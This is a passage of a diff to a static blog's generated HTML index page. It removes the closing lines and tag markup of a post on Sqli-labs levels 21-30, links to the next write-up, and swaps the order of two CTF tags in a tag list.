-<p>至此，21-30关的Write-up结束</p>
-<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/01/Sqli-labs%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/01/31/Sqli-labs 第21-30关/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/2/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/Knlvre.github-io/page/4/">4</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/4/">Next &raquo;</a>
@@ -1462,11 +1437,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
